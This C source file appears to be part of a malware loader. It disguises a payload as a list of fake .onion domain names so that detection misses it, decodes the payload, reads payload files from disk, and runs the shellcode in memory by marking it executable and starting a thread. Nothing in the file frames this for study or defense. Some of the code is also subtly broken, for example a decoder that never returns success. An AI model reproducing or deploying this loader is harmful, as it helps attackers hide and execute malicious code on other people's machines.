#include "Common.h"

/* Encode exactly 35 bytes into 56 base32 chars (no padding).
 * out must be at least 56 bytes. */
static void base32_encode_35(const BYTE* in, char* out) {
    for (int i = 0; i < 7; i++) {
        const BYTE* b = in + i * 5;
        ULONGLONG val = ((ULONGLONG)b[0] << 32) |
            ((ULONGLONG)b[1] << 24) |
            ((ULONGLONG)b[2] << 16) |
            ((ULONGLONG)b[3] << 8) |
            ((ULONGLONG)b[4]);

        char* o = out + i * 8;
        o[0] = BASE32_ALPHABET[(val >> 35) & 0x1F];
        o[1] = BASE32_ALPHABET[(val >> 30) & 0x1F];
        o[2] = BASE32_ALPHABET[(val >> 25) & 0x1F];
        o[3] = BASE32_ALPHABET[(val >> 20) & 0x1F];
        o[4] = BASE32_ALPHABET[(val >> 15) & 0x1F];
        o[5] = BASE32_ALPHABET[(val >> 10) & 0x1F];
        o[6] = BASE32_ALPHABET[(val >> 5) & 0x1F];
        o[7] = BASE32_ALPHABET[(val) & 0x1F];
    }
}

/* Decode 56 base32 chars back into 35 bytes.
 * Returns TRUE on success, FALSE on invalid character. */
static BOOL base32_decode_35(const char* in, BYTE* out) {
    static INT8 rev[256];
    static BOOL rev_init = FALSE;

    if (!rev_init) {
        RtlSecureZeroMemory(rev, sizeof(rev));
        /* -1 as 0xFF since INT8 */
        FillMemory(rev, sizeof(rev), 0xFF);
        for (int i = 0; i < 32; i++)
            rev[(BYTE)BASE32_ALPHABET[i]] = (INT8)i;
        rev_init = TRUE;
    }

    for (int i = 0; i < 7; i++) {
        const char* c = in + i * 8;
        ULONGLONG val = 0;

        for (int j = 0; j < 8; j++) {
            INT8 v = rev[(BYTE)c[j]];
            if (v < 0) return FALSE;  /* invalid char */
            val = (val << 5) | (BYTE)v;
        }

        BYTE* b = out + i * 5;
        b[0] = (BYTE)((val >> 32) & 0xFF);
        b[1] = (BYTE)((val >> 24) & 0xFF);
        b[2] = (BYTE)((val >> 16) & 0xFF);
        b[3] = (BYTE)((val >> 8) & 0xFF);
        b[4] = (BYTE)((val) & 0xFF);
    }
    return TRUE;
}

/*
 * ObfuscateToOnions()
 *
 * Encodes `payload` (len bytes) into a NULL-terminated array of fake .onion
 * domain strings. Memory is allocated on the process heap.
 * The last chunk is zero-padded if len is not a multiple of 35.
 * A 4-byte LE length header is prepended so deobfuscation knows the real size.
 *
 * Caller must free each string and the array with HeapFree(GetProcessHeap(), 0, ptr).
 */
char** ObfuscateToOnions(const BYTE* payload, SIZE_T len, SIZE_T* out_count) {
    HANDLE heap = GetProcessHeap();

    SIZE_T total_len = len + 4;
    SIZE_T n_domains = (total_len + BYTES_PER_DOMAIN - 1) / BYTES_PER_DOMAIN;

    BYTE* buf = (BYTE*)HeapAlloc(heap, HEAP_ZERO_MEMORY, n_domains * BYTES_PER_DOMAIN);
    if (!buf) return NULL;

    /* Write 4-byte LE length header */
    buf[0] = (BYTE)((len) & 0xFF);
    buf[1] = (BYTE)((len >> 8) & 0xFF);
    buf[2] = (BYTE)((len >> 16) & 0xFF);
    buf[3] = (BYTE)((len >> 24) & 0xFF);
    RtlMoveMemory(buf + 4, payload, len);

    char** domains = (char**)HeapAlloc(heap, HEAP_ZERO_MEMORY, (n_domains + 1) * sizeof(char*));
    if (!domains) {
        HeapFree(heap, 0, buf);
        return NULL;
    }

    for (SIZE_T i = 0; i < n_domains; i++) {
        domains[i] = (char*)HeapAlloc(heap, HEAP_ZERO_MEMORY, DOMAIN_LEN);
        if (!domains[i]) {
            for (SIZE_T j = 0; j < i; j++) HeapFree(heap, 0, domains[j]);
            HeapFree(heap, 0, domains);
            HeapFree(heap, 0, buf);
            return NULL;
        }
        base32_encode_35(buf + i * BYTES_PER_DOMAIN, domains[i]);
        RtlMoveMemory(domains[i] + CHARS_PER_DOMAIN, ONION_SUFFIX, sizeof(ONION_SUFFIX));
    }
    domains[n_domains] = NULL;

    HeapFree(heap, 0, buf);
    if (out_count) *out_count = n_domains;
    return domains;
}

/*
 * DeobfuscateFromOnions()
 *
 * Decodes a NULL-terminated array of fake .onion domains back to the original
 * payload. Returns a heap-allocated buffer, sets *out_len.
 * Returns NULL on error.
 *
 * Caller must free the result with HeapFree(GetProcessHeap(), 0, ptr).
 */
BOOL DeobfuscateFromOnions(char** domains, SIZE_T count, SIZE_T* out_len, BYTE** pPayload) {
    HANDLE heap = GetProcessHeap();

    BYTE* buf = (BYTE*)HeapAlloc(heap, HEAP_ZERO_MEMORY, count * BYTES_PER_DOMAIN);
    if (!buf) return FALSE;

    for (SIZE_T i = 0; i < count; i++) {
        if (!base32_decode_35(domains[i], buf + i * BYTES_PER_DOMAIN)) {
            HeapFree(heap, 0, buf);
            return FALSE;
        }
    }

    /* Read 4-byte LE length header */
    SIZE_T len = (SIZE_T)buf[0] |
        (SIZE_T)buf[1] << 8 |
        (SIZE_T)buf[2] << 16 |
        (SIZE_T)buf[3] << 24;

    BYTE* out = (BYTE*)HeapAlloc(heap, HEAP_ZERO_MEMORY, len);
    if (!out) {
        HeapFree(heap, 0, buf);
        return FALSE;
    }
    RtlMoveMemory(out, buf + 4, len);

    HeapFree(heap, 0, buf);
    if (out_len) *out_len = len;
    *pPayload = out;
}

BOOL ReadPayloadFile(const char* FileInput, PDWORD sPayloadSize, unsigned char** pPayloadData) {


    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD FileSize = NULL;
    DWORD lpNumberOfBytesRead = NULL;

    hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Create File Failed with error: %d \n", GetLastError());
        return FALSE;
    }

    FileSize = GetFileSize(hFile, NULL);

    unsigned char* Payload = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, FileSize);

    RtlZeroMemory(Payload, FileSize);

    if (!ReadFile(hFile, Payload, FileSize, &lpNumberOfBytesRead, NULL)) {
        printf("[!] Read File Failed with error: %d", GetLastError());
        return FALSE;
    }


    *pPayloadData = Payload;
    *sPayloadSize = lpNumberOfBytesRead;

    CloseHandle(hFile);

    if (*pPayloadData == NULL || *sPayloadSize == NULL)
        return FALSE;

    return TRUE;
}

VOID LocalPayloadExecute(PBYTE Payload, SIZE_T PayloadLength) {

    PVOID pShellcodeAddress = VirtualAlloc(NULL, PayloadLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }

    memcpy(pShellcodeAddress, Payload, PayloadLength);
    memset(Payload, '\0', PayloadLength);


    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, PayloadLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    HANDLE hTread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
    if (hTread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }
    WaitForSingleObject(hTread, INFINITE);
}